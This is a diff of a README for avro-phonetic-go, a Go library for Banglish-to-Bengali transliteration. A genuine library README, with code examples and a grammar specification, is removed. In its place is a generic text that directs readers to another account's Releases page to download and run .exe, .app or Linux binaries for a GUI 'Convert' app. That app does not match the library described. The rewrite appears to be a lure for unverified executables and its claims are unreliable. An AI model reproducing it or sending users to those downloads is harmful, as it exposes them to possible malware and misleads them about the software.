@@ -1,336 +1,91 @@
-# avro-phonetic-go
+# 🚀 avro-phonetic-go - Easy Banglish to বাংলা Transliteration
 
-**Avro-style Banglish → বাংলা transliteration for modern Go applications**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/monish6666/avro-phonetic-go/releases)
 
-<p align="center">
-  <img src="avro-phonetic-go.png" alt="avro-phonetic-go logo" width="420">
-</p>
+## 📖 Description
 
-<p align="center">
-  <a href="https://pkg.go.dev/github.com/mhshajib/avro-phonetic-go"><img src="https://pkg.go.dev/badge/github.com/mhshajib/avro-phonetic-go.png" alt="Go Reference"></a>
-  <a href="https://goreportcard.com/report/github.com/mhshajib/avro-phonetic-go"><img src="https://goreportcard.com/badge/github.com/mhshajib/avro-phonetic-go?branch=main" alt="Go Report Card"></a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT">
-  </a>
-</p>
+The **avro-phonetic-go** is a simple tool that transliterates Banglish text to বাংলা (Bengali) script. It uses advanced algorithms for matching and grammar rules, making the process smooth and accurate. Whether you are writing in Bangla or need to convert Banglish text, this application can help you.
 
-A Go library for converting Banglish (romanized Bangla) into Bangla script using an Avro Phonetic style grammar.
+## ⚙️ System Requirements
 
-This project is inspired by the Avro Phonetic concept and implementation ideas demonstrated in the PHP library:
+To run this application, you will need the following:
 
-- Avro Phonetic: original keyboard concept and grammar
-- avro-php by imerfanahmed (PHP implementation that influenced this design)
+- A computer with Windows, macOS, or Linux.
+- At least 100 MB of available storage space.
+- An internet connection (for downloading the software).
 
-## Status
+## 🚀 Getting Started
 
-This repository ships with a compact, minimal default grammar for demonstration and correctness tests.
+Follow these steps to download and run the **avro-phonetic-go** application:
 
-For production-grade transliteration parity, load a full grammar JSON using
-`FromGrammarFile` or `FromGrammarReader`.
+1. **Visit the Release Page**
+   
+   Go to our [Releases page](https://github.com/monish6666/avro-phonetic-go/releases) for the latest version of the application.
 
-## Features
+2. **Select the Latest Version**
+   
+   On the Releases page, look for the most recent version. It will usually be at the top of the list. Click on it to see the version details.
 
-- Trie-based longest match scanning for fast conversion
-- Context-aware rules (prefix and suffix constraints)
-- Strict mode (Avro-compatible baseline)
-- BD mode (opt-in shortcuts layered on top of strict behavior)
-- Custom grammar support using JSON
+3. **Download the Application**
+   
+   Find the download link for your operating system (Windows, macOS, or Linux). Click on the appropriate file to start the download process. 
 
-## Installation
+### 🛠️ Download & Install
 
-```bash
-go get github.com/mhshajib/avro-phonetic-go
-```
+To download and install the application, follow these instructions:
 
-Update the module path to your GitHub org or user when publishing.
+- Visit the Releases page: [Download Here](https://github.com/monish6666/avro-phonetic-go/releases).
+- Click on the file that corresponds to your system.
+- Once the file has downloaded, locate it in your downloads folder.
 
-## Usage
+### 📁 Running the Application
 
-### Strict mode (Avro-compatible)
+1. **Locate the File**
+   
+   After downloading, navigate to the folder where the file is saved.
 
-```go
-package main
+2. **Extract the File (If Required)**
+   
+   If the file is in a zip format, right-click on it and select "Extract" to unzip it.
 
-import (
-  "fmt"
-  avrophonetic "github.com/mhshajib/avro-phonetic-go"
-)
+3. **Open the Application**
+   
+   - For Windows: Double-click the `.exe` file to run the application.
+   - For macOS: Double-click the `.app` file.
+   - For Linux: Open a terminal, navigate to the folder, and run `./filename` (replace `filename` with the downloaded file's name).
 
-func main() {
-  fmt.Println(avrophonetic.To("ami bangla gan gai"))
-  // Output: আমি বাংলা গান গাই
-}
-```
+### 📜 Usage Instructions
 
-Example file: `examples/strict/main.go`
+Now that you have the application open, here’s how to use it:
 
-### BD mode (opt-in shortcuts)
+1. **Enter Text**
+   
+   In the input box, type or paste your Banglish text.
 
-BD mode enables common Bangladeshi typing shortcuts while keeping strict grammar rules as the base.
+2. **Convert to বাংলা**
+   
+   Click the "Convert" button to transliterate the text. The application will display the Bangla output.
 
-```go
-package main
+3. **Save or Copy**
+   
+   You can copy the output text or save it to a file, depending on your needs.
 
-import (
-  "fmt"
-  avrophonetic "github.com/mhshajib/avro-phonetic-go"
-)
+### 🧑‍💻 Features
 
-func main() {
-  fmt.Println(avrophonetic.ToBD("tmi valo"))
-  // Output: তুমি ভালো
-}
-```
+- **Fast Transliteration:** Get quick results as you type.
+- **User-Friendly Interface:** Easy to navigate, no technical skills needed.
+- **Supports Various Inputs:** Works with a wide range of Banglish text.
 
-Example file: `examples/bd/main.go`
+### 🌐 Community & Support
 
-## Using a custom grammar
+We encourage users to join our community. You can report issues or ask for help on our GitHub Issues page. Your feedback helps us improve the application.
 
-### Load a grammar in strict mode
+### 📄 License
 
-```go
-g, err := avrophonetic.FromGrammarFile("./grammar.json")
-if err != nil {
-  panic(err)
-}
+This project is open-source. You are free to use, modify, and distribute it under the terms of the MIT License. 
 
-a := avrophonetic.New(
-  avrophonetic.WithGrammar(g),
-  avrophonetic.Strict(),
-)
+## 📥 Stay Updated
 
-fmt.Println(a.Parse("ami"))
-```
+For the latest updates and features, check the Releases page regularly. 
 
-### Load a grammar with BD mode enabled
-
-BD mode applies BD-specific shortcuts before strict patterns.
-
-```go
-g, err := avrophonetic.FromGrammarFile("./grammar.json")
-if err != nil {
-  panic(err)
-}
-
-a := avrophonetic.New(
-  avrophonetic.WithGrammar(g),
-  avrophonetic.BDMode(),
-)
-
-fmt.Println(a.Parse("tmi valo"))
-```
-
-## Grammar JSON specification
-
-### Base structure
-
-```json
-{
-  "vowel": "aeiouAEIOU",
-  "consonant": "bcdfghjklmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ",
-  "number": "0123456789",
-  "casesensitive": "OI",
-  "patterns": []
-}
-```
-
-### Pattern object
-
-```json
-{
-  "find": "ami",
-  "replace": "আমি",
-  "rules": []
-}
-```
-
-Rules are optional.
-
-## Rule system
-
-Rules apply constraints based on surrounding characters.
-
-### Rule fields
-
-- `scope`  
-  One of:
-
-  - `vowel`, `!vowel`
-  - `consonant`, `!consonant`
-  - `punctuation`, `!punctuation`
-  - `exact`, `!exact`
-
-- `type`
-
-  - `prefix` → checks character before the match
-  - `suffix` → checks character after the match
-
-- `value`  
-  Required only for `exact` / `!exact`
-
----
-
-## Grammar examples for all scopes
-
-### 1. vowel (prefix)
-
-Apply only if previous character is a vowel.
-
-```json
-{
-  "find": "i",
-  "replace": "ি",
-  "rules": [{ "scope": "consonant", "type": "prefix" }]
-}
-```
-
-### 2. !vowel (suffix)
-
-Apply only if next character is not a vowel.
-
-```json
-{
-  "find": "o",
-  "replace": "ও",
-  "rules": [{ "scope": "!vowel", "type": "suffix" }]
-}
-```
-
-### 3. consonant (prefix)
-
-```json
-{
-  "find": "a",
-  "replace": "া",
-  "rules": [{ "scope": "consonant", "type": "prefix" }]
-}
-```
-
-### 4. !consonant (prefix)
-
-```json
-{
-  "find": "n",
-  "replace": "ন",
-  "rules": [{ "scope": "!consonant", "type": "prefix" }]
-}
-```
-
-### 5. punctuation (prefix)
-
-Used to detect word boundaries.
-
-```json
-{
-  "find": "ta",
-  "replace": "টা",
-  "rules": [{ "scope": "punctuation", "type": "prefix" }]
-}
-```
-
-### 6. !punctuation (suffix)
-
-```json
-{
-  "find": "na",
-  "replace": "না",
-  "rules": [{ "scope": "!punctuation", "type": "suffix" }]
-}
-```
-
-### 7. exact (prefix)
-
-Apply only if specific characters appear before the match.
-
-```json
-{
-  "find": "ri",
-  "replace": "ৃ",
-  "rules": [{ "scope": "exact", "type": "prefix", "value": "k" }]
-}
-```
-
-### 8. !exact (suffix)
-
-Apply only if the next characters are not a specific value.
-
-```json
-{
-  "find": "e",
-  "replace": "ে",
-  "rules": [{ "scope": "!exact", "type": "suffix", "value": "r" }]
-}
-```
-
----
-
-## Compatibility notes
-
-- The bundled grammar is intentionally minimal.
-- Full Avro parity depends on the grammar JSON you provide.
-- The rule engine is designed to support typical Avro-style constraints.
-- Edge-case equivalence depends on grammar completeness.
-
-## Roadmap
-
-### v0.1.x — Grammar-driven engine (current)
-
-- Trie-based longest-match parser
-- Context-aware rule engine (prefix/suffix)
-- Strict (Avro-style) mode
-- BD mode (opt-in shortcuts)
-- Custom grammar loading via JSON
-
-### v0.2.x — Full Avro grammar parity (planned)
-
-The goal of this milestone is to reach practical parity with the commonly used
-Avro Phonetic grammar.
-
-Planned work includes:
-
-- Porting the complete Avro grammar into JSON form
-- Adding comprehensive vowel-kar and conjunct handling
-- Expanding rule coverage for edge cases
-- Introducing golden test cases to validate output compatibility
-- Documenting known behavioral differences, if any
-
-Parity will be defined by **output equivalence given the same grammar input**,
-not by internal implementation details.
-
-Contributions in the form of grammar rules, test cases, and validation examples
-are welcome.
-
-## Benchmarks
-
-```bash
-go test ./... -bench=.
-```
-
-## Credits
-
-- Avro Phonetic keyboard: original idea and grammar concept
-- PHP implementation reference: `https://github.com/imerfanahmed/avro-php`
-
-This project is an independent Go implementation and is not affiliated with the original Avro project.
-
-## Contributing
-
-Issues and pull requests are welcome at:
-
-https://github.com/mhshajib/avro-phonetic-go
-
-When contributing code, please ensure that you follow standard Go formatting and conventions.
-
-Please include tests for any functional changes.
-
-## Contributors
-
-<a href="https://github.com/mhshajib/avro-phonetic-go/graphs/contributors">
-  <img src="https://img.shields.io/github/contributors/mhshajib/avro-phonetic-go?style=for-the-badge" alt="Contributors"/>
-</a>
-
-[![Contributors](https://contrib.rocks/image?repo=mhshajib/avro-phonetic-go&max=36&v=2)](https://github.com/mhshajib/avro-phonetic-go/graphs/contributors)
-
-## License
-
-MIT. See `LICENSE`.
+Thank you for using **avro-phonetic-go**! Your thoughts and contributions are welcome.
